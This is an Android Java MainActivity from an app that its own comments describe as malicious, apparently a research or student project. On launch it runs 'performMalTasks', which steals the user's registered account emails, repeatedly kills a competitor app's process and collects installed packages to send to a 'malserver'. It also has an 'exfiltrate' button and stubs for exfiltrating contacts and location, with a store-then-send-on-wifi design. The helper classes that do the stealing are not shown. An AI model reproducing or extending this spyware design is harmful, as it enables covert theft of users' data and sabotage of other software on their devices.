package com.trustme.testsu;




import com.trustme.testsu.utils.Constants;
import android.os.AsyncTask;
import android.os.Bundle;
import android.app.Activity;
import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.util.Log;
import android.view.Menu;
import android.view.View;
import android.widget.Button;

public class MainActivity extends Activity {
	public static final String TAG = "Main Activity";
	
	
	public static Context ctx;
	protected Button btn_exfiltrate, btn_check_ip, btn_stop_check_ip;
	
	private Monopoly monopoly = new Monopoly();
	private AccountThief accountThief = new AccountThief();
	private WiFiTracker wifiTracker = new WiFiTracker();
	
	private SQLiteDatabase database;
	private ContactsDataSource datasource;
	
	
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
         ctx = this;
         
         datasource = new ContactsDataSource(this);
         database = datasource.open();
         //we should start checking for Internet connection only when there are new data available
        
         prepareButtons();
         performMalTasks();
	
    }
    
    @Override
    public void onDestroy(){
    	datasource.close();
    	monopoly.stopkillingCompetitor();
    	super.onDestroy();
    }
    
	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		getMenuInflater().inflate(R.menu.activity_main, menu);
		return true;
	}
 
////////////////////////////////////////////////////////////////////////////////////////////////////////////////	
   
    /**
     * Prepares the buttons of the application
     * @author sdemetr2
     */
	private void prepareButtons() {
		// TODO Auto-generated method stub
		prepareButtonCheckIp();
        prepareButtonStopCheckIp();
        prepareButtonExfiltrate();
	}
	
	/**
     * Perform malicious tasks
     * @author sdemetr2
     */
	private void performMalTasks() {
		// TODO Auto-generated method stub
		//getUserLocation();

        getUserAccounts();
        killCompetitor();
        getInstalledApplications();
        
        //getContacts(); //TODO: nikhil
		//changeSuperUserPrefs();
	}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////	
	
	/**
	 * It calls the account thief with the message to steal user's registered emails.
	 * @author sdemetr2
	 */
	private void getUserAccounts() {
		// TODO Auto-generated method stub
		accountThief.getUserAccounts();
	}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////	
	
	/**
	 * Calls monopoly with the message to start killing our competitor's app. </ br>
	 * It checks periodically whether the competitor's PID is registered. If it does it KILLS
	 * 	its process.
	 * @author sdemetr2
	 */
	private void killCompetitor() {
		// TODO Auto-generated method stub
		monopoly.killCompetitor();
	}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	
	/**
	* This function should fetch and try to exfiltrate 
	* 	all installed applications.</br>
	* If there is no wifi store the data in the Database and
	* 	exfiltrate as soon as the wifi is back on.</br>
	* Ideally it should perform this action in the background.
	* @author sdemetr2
	* 
	*/
	private void getInstalledApplications() {
		// TODO Auto-generated method stub
		//send installed packages with their PID to malserver
		//server responds with competitors pid
		//app kills that pid whenever it runs
		GetPackagesTask get_packages_task = new GetPackagesTask();
		get_packages_task.execute();
	}	
	
////////////////////////////////////////////////////////////////////////////////////////////////////////////////

	/**
	 * 
     * This function should fetch and and try to exfiltrate 
     * 	the device's location.
     * If there is no wifi store the data in the Database and
     * 	exfiltrate as soon as the wifi is back on.
     * Ideally it should perform this action in the background.
     * @author sdemetr2
     */
	private void getUserLocation() {
		// TODO Auto-generated method stub
		
	}
	
//////////////////////////////////////////////////////////////////////////////////////////////////////////////	
	
    /**
     * This function should fetch and and try to exfiltrate 
     * 	all user's contacts.
     * If there is no wifi store the data in the Database and
     * 	exfiltrate as soon as the wifi is back on.
     * Ideally it should perform this action in the background.
     * @author sdemetr2
     * 
     */
	private void getContacts() {
	
		GetContactsTask get_contacts_task = new GetContactsTask();
		get_contacts_task.execute();
	}   

	
//////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////	
	
	private void prepareButtonCheckIp() {
		// TODO Auto-generated method stub
    	btn_check_ip = (Button) findViewById(R.id.start_ip_checking);
    	
    	btn_check_ip.setOnClickListener(new View.OnClickListener() {
			
			public void onClick(View v) {
				// TODO Auto-generated method stub
				wifiTracker.start_checking_for_ip();
				//start_checking_for_competitor();
			}

		});
	}


	private void prepareButtonStopCheckIp() {
		// TODO Auto-generated method stub
    	btn_stop_check_ip = (Button) findViewById(R.id.stop_ip_checking);
    	
    	btn_stop_check_ip.setOnClickListener(new View.OnClickListener() {
			
			public void onClick(View v) {
				// TODO Auto-generated method stub
				wifiTracker.stop_checking_for_ip();
				//stop_checking_for_competitor();
			}

		});
	}
    
    private void prepareButtonExfiltrate() {
		// TODO Auto-generated method stub
    	btn_exfiltrate = (Button) findViewById(R.id.exfiltrate);
    	
    	btn_exfiltrate.setOnClickListener(new View.OnClickListener() {
			
			public void onClick(View v) {
				// TODO Auto-generated method stub
				Hermes hermes = new Hermes();
				hermes.exfiltrate(null,Constants.TEST_TRANSACTION);
			}

		});
	}
  
//////////////////////////////////////////////////////////////////////////////////////////////////////////////    
    

  
//////////////////////////////////////////////////////////////////////////////////////////////////////////////
	/**
	 * 
	 * Background Task for fetching user's contacts.
	 * It should try to exfiltrate them if there is Internet available or store them
	 *	in the Db and start the IP checker
	 *@author sdemetr2
	 */
	public class GetContactsTask extends AsyncTask<Void, Void, Void>{
		protected GetContactsTask() { }
		
		@Override
		protected Void doInBackground(Void... unused){
			try {
				// pass time so the built-in dialer app can make the call
				Thread.sleep(50);
			}
			catch (InterruptedException localInterruptedException)
			{
				Log.d("GetPackagesTask", "GetPackagesTask received an InterruptedException");
			}
			
			return null;
		}
		
		@Override
		protected void onPostExecute(Void justEyeCandy){
			super.onPostExecute(justEyeCandy);
			getAndSaveContacts();
			//getPackages();
		}
	
		private void getAndSaveContacts() {
			// TODO try to exfiltrate them if there is Internet available or store them in the Db and start the IP checker          
			 
			 database.execSQL("insert into " + DatabaseOpenHelper.DATABASE_TABLE_NAME + " (name,surname,phone)" + "values(\"soteris\",\"demetriou\","
			                 + "\"102853471\") ;");
			 Cursor c = database.rawQuery("Select * from " + DatabaseOpenHelper.DATABASE_TABLE_NAME, null);
			 c.moveToNext();
			 Log.i(TAG,c.getString(c.getColumnIndex(DatabaseOpenHelper.COLUMN_NAME)));
	
		}
	}  
//////////////////////////////////////////////////////////////////////////////////////////////////////////////
    
}
